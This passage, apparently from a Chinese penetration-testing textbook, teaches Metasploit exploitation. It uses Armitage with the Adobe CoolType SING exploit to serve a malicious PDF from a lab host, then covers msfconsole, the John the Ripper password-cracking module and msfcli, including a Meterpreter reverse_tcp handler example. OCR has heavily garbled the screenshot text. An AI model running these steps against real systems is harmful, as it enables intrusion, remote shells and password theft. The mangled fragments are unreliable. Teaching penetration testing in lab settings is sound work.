rosoft:wind
2000|XP
dows_2000:sp
Os details:MicrosoftW
ws 2000 SP0 - SP4 or Winde
I45 - 045 dX sMc
I; CPE: cpe:/e
med. Please report any
lress [1 hc
up) sci
ed in 7.71 sect
图6.12扫描的操作系统
（9）从该界面可以看到扫描到的目标主机，屏幕发生了变化。此时就可以选择目标，
进行渗透攻击。
（10）此时，可以在预配置模块窗口选择模块渗透攻击目标系统，如选择渗透攻击浏
览器模块。在预配置模块中依次选择exploitlwindowsbrowserladobe_cooltype_sing模块，双
windows/browser/adobe_cooltype_sing
Adobe CoolType SING Table “uniqueNiame* Stack Buffer Overflow
This module exploits a vulnerability in the Smart INdependent, Glyples (SINGi) table handing within versions
8.2.4 and 9.3.4 of Adebe Reader. Prior versions are assumed to be vulnerable as well
Dption
Value
ExitOnSession
false
false
LPORT
LHOST
192.168.41.235
8107
PAYLOAD +
SRVHOST
0.0.0.0
mindo
SRVPORT
8080
SSL
SSLCert
SSLVersion
URIPATH
SSL3
 Show advanced options
Launch
图6.13模块配置选项
（11）该界面显示了adobe_cooltype_sing模块的默认配置选项信息。这些选项的默认
值，可以通过双击默认值修改。设置完成后，单击Launch按钮，在Armitage窗口将显示
如图6.14所示的界面。
· 153 ·
---
## Page 166
第2篇信息的收集及利用
Armitage
atup
rge
adobto
 adobe,lash_o
[ adobs,flast,n
192.168.41.1
192.168.41.2
192.168.41.146
aing x
] >SEt PAYLOAD W
set TARGET 0
g) > set SRVHOST 0.0.0.0
0.0.0.0
alsc
on false
TAEGV7G
TAEGV7G
图6.14渗透攻击结果
（12）从该界面可以看到，使用adobe_cooltype_sing模块渗透攻击的过程。从最后的
信息中可以看到，渗透攻击成功运行。以后某台主机访问http://192.168.41.235:8080/
JEdB2oma7AEGV7G链接时，将会在目标主机上创建一个名为JEdB2oma7AEGV7G的PDF
文件。只要有目标主机访问该链接，Armitage控制台会话中将会显示访问的主机，如图6.15
所示。
Armitage
-口
 briNo
 backspeetc
 adobeflsh
dobe_flsh,
192.168.41.1
192.168.41.2
192.168.41.146
)>set ExitOnSession false
1191
192.168.41.235:8684
AEGV70
a7AEGV7G
图6.15攻击信息
（13）从该界面可以看到主机192.168.41.146，访问了http://192.168.41.235:8080/
JEdB2oma7AEGV7G链接。并且，可以看到在主机192.168.41.146上创建了PDF文件。
• 154 ·
---
## Page 167
第6章漏洞利用
6.2.2
控制Metasploit终端（MSFCONSOLE）
MSF终端（MSFCONSOLE）是目前Metasploit框架最为流行的用户接口，而且也是
非常灵活的。因为MSF终端是Metasploit框架中最灵活、功能最丰富及支持最好的工具之
一。MSFCONSOLE主要用于管理Metasploit数据库，管理会话、配置并启动Metasploit
模块。本质上来说，就是为了利用漏洞，MSFCONSOLE将获取用户连接到主机的信息，
以至于用户能启动渗透攻击目标系统。本小节将介绍Metasploit终端（MSFCONSOLE）。
当使用Metasploit控制台时，用户将使用一些通用的命令，如下所示。
口help：该命令允许用户查看执行命令的帮助信息。
口use module：该命令允许用户加载选择的模块。
口setoptionname module：该命令允许用户为模块设置不同的选项。
口run：该命令用来启动一个非渗透攻击模块。
口search module：该命令允许用户搜索一个特定的模块。
口exit：该命令允许用户退出MSFCONSOLE。
MSFCONSOLE漏洞利用的具体操作步骤如下所示。
（1）在终端启动MSFCONSOLE，执行命令如下所示：
root@kali:~#msfconsole
执行以上命令后，输出信息如下所示：
|METASPLOIT by Rapid7
=C
(o（
(_01**
"|======[***
)=\
EXPLOIT
I/
儿L
1
|==[msf >]=========
//RECON
1（@（@@@@（@@
VWW/
。0
)======
0
LOOT
PAYLOAD
（
1(①*(**(①
Easy phishing: Set up email templates, landing pages and listeners
in Metasploit Pro's wizard -- type 'go_pro' to launch it now.
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ - --=[ 1256 exploits - 762 auxiliary - 212 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
提示符，表示登录MSFCONSOLE成功。此时就可以在该命令行
运行其他任何命令。
· 155 ·
---
## Page 168
第2篇信息的收集及利用
（2）使用search命令搜索所有有效的Linux模块。对于模块用户每次想要执行一个动
作，这是一个很好的主意。主要原因是Metasploit各种版本之间，模块的路径可能有改变。
执行命令如下所示：
msf> search linux
执行以上命令后，输出信息如下所示：
Matching Modules
Name
Disclosure Date
Rank
Description
****
auxiliary/admin/http/jboss_seam_exec 2010-07-19 00:00:00 UTC normal JBoss Seam 2
Remote Command Execution
auxiliary/analyze/jtr_linux
normal John the Ripper
Linux Password Cracker
auxiliary/analyze/jtr_unshadow
normal Unix Unshadow
Utility
auxiliary/dos/wifi/netgear_ma521_rates
normal NetGear MA521
Wireless Driver Long Rates Overflow
auxiliary/dos/wifi/netgear_wg311pci
normal NetGear WG311v1
Wireless Driver Long SSID Overflow
auxiliary/scanner/http/atlassian_crowd_fileaccess
normal Atlassian Crowd
XML Entity Expansion Remote File Access
auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess
normal HP SiteScope
SOAP Call getFilelnternal Remote File Access
auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration
normal HP SiteScope
SOAP Call getSiteScopeConfiguration Configuration Access
auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess
normal HP SiteScope
SOAP Call loadFileContent Remote File Access
省略部分内容
post/multi/manage/play_youtube
normal
Multi Manage YouTube Broadcast
post/multi/manage/record_mic
normal
Multi Manage Record Microphone
post/multi/manage/sudo
normal
Multiple Linux / Unix Post Sudo Upgrade Shell
post/multi/manage/system_session normal
Multi Manage System Remote TCP Shell
Session
post/pro/multi/agent
normal
Metasploit Pro Persistent Agent
post/pro/multi/agent_cleaner
normal
Metasploit Pro Persistent Agent Cleaner
post/pro/multi/gather/hashdump
Pro: Multi Gather Hashdump
post/pro/multi/gather/sysinfo
normal
Unix Gather System Info
post/pro/multi/macro
normal
Metasploit Pro Post Exploitation Macro Launcher
post/windows/manage/pxexploit
normalWindows Manage PXE Exploit Server
输出的信息就是Metasploit中所有有效的模块。输出的信息显示为4列，分别表示模
块名称、公开时间、等级及描述。以上输出的内容较多，但是由于篇幅的原因，这里只列
出了一少部分内容，省略的内容使用省略号（..）代替。
（3）使用JohnRipperlinux密码破解模块。执行命令如下所示：
msf > use auxiliary/analyze/jtr_linux
msf auxiliary(jtr_linux) >
输出的信息表示已加载jtrlinux模块。
（4）查看模块的有效选项。执行命令如下所示：
* 156 *
---
## Page 169
第6章漏洞利用
msf auxiliary(jtr_linux) > show options
Module options (auxiliary/analyze/jtr_linux):
Name
CurrentSetting
Required
Description
Crypt
false
no
Try crypt() format hashes(Very Slow)
JOHN_BASE
no
The directory containing John the Ripper (src,
run, doc)
JOHN_PATH
no
The absolute path to the John the Ripper
executable
Munge
false
ou
Munge the Wordlist (Slower)
Wordlist
no
The path to an optional Wordlist
msf auxiliary(jtr_linux)>
从输出结果中可以看到jtr_linux模块有5个有效的选项，如Crypt、JOHN_BASE、
JOHEPATH、Munge和Wordlist。在输出的信息中，对这5个选项分别有详细的描述。
（5）现在用户有一个选项的列表，这些选项为运行jtr_linux模块。用户能设置独特的
选项，使用set命令。设置JOHNPATH选项，如下所示：
msf auxiliary(jtr_linux)
>setJOHN_PATH/usr/share/metasploit-framework/data/john/
wordlists/password.lst
JOHN_PATH =>/usr/share/metasploit-framework/data/john/wordlists/ password.lst
（6）现在运行渗透攻击，执行命令如下所示：
msf auxiliary(jtr_linux) > exploit
6.2.3控制Metasploit命令行接口（MSFCLI）
本小节将介绍Metasploit命令行接口（MSFCLI为字完成Metasploit的攻击任务，
需要使用一个接口。MSFCLI刚好实现这个功能。为了学习Metasploit或测试/写一个新的
渗透攻击，MSFCLI是一个很好的接口。
MSF命令行和MSF终端为Metasploit框架访问提供了两种截然不同的途径，MSF终
端以一种用户友好的模式来提供交互方式，用于访问软件所有的功能特性，而MSFCLI则
主要考虑脚本处理和与其他命令行工具的互操作性。MSFCLI常用的命令如下所示。
口msfcli：加载所有有效渗透攻击MSFCLI的列表。
口msfcli-h：查看MSFCLI帮助文档。
msfcli[PATH TO EXPLOIT][options=value]：启动渗透攻击的语法。
MSF命令行MSFCLI的使用如下所示。
（1）启动MSF命令行（MSFCLI）。启动的过程需要一点时间，请耐心等待，这取决
于用户系统的速度。还要注意，随着MSFCLI负载，可利用的有效列表将显示出来。执行
命令如下所示：
root@kali:~# msfcli
[*] Please wait while we load the module tree..
（2）查看MSFCLI帮助文档。执行命令如下所示：
root@kali:~# msfcli -h
Mode
Description
(A)dvanced
Show available advanced options for this module
· 157 ·
---
## Page 170
第2篇信息的收集及利用
(AC)tions
Show available actions for this auxiliary module
(C)heck
Run the check routine of the selected module
(E)xecute
Execute the selected module
(H)elp
You're looking at it baby!
(I)DS Evasion
Show available ids evasion options for this module
(O)ptions
Show available options for this module
(P)ayloads
Show available payloads for this module
(S)ummary
Show information about this module
(T)argets
Show available targets for this exploit module
Examples:
msfcli multi/handler payload=windows/meterpreter/reverse_tcp Ihost=iP E
以上输出的信息显示了msfcli命令的帮助文档。通过查看这些帮助文档，可以了解一
个模块的使用说明和使用模式列表。
（3）为了证明前面所说的帮助文档信息。这里将选择A选项，显示模块的高级选项。
执行命令如下所示：
root@kali:/usr/bin# msfcli auxiliary/scanner/portscan/xmas A
[*] Initializing modules...
Current Setting:
Name
: GATEWAY
Description
:The gateway IP address. This will be used rather than a random remote
address for the UDP probe, if set.
Name
Current Setting
:NETMASK
: 24
Description
: The local network mask. This is used to decide if an address is in the local
network.
Name
:ShowProgress
Current Setting
: true
Description
: Display progress messages during a scan
Name
:ShowProgressPercent
Current Setting
: 10
Description
: The interval in percent that progress should be shown
Name
:UDP_SECRET
Current Setting
：1297303091
Description
: The 32-bit cookie for UDP probe requests.
Name
:VERBOSE
Current Setting
:false
Description
:Enable detailed status messages
Name
:WORKSPACE
Current Setting
：
Description
 : Specify the workspace for this module
以上信息显示了xmas模块的高级选项。输出信息中对每个选项都有3部分介绍，包
括名称、当前设置及描述信息。
（4）此外，用户可以使用S模式列出当前模块的一个摘要信息。这个摘要模式是查看
所有有效选项的一个很好的方法。大部分选项是可选的。但是为了使用户设置目标系统或
端口，通常有些选项是必须的。启动摘要模式渗透攻击，执行命令如下所示：
root@kali:/usr/bin# msfcli auxiliary/scanner/portscan/xmas S
[*] Initializing modules...
Name : TCP *XMas* Port Scanner
Module
: auxiliary/scanner/portscan/xmas
License
: Metasploit Framework License (BSD)
Rank
: Normal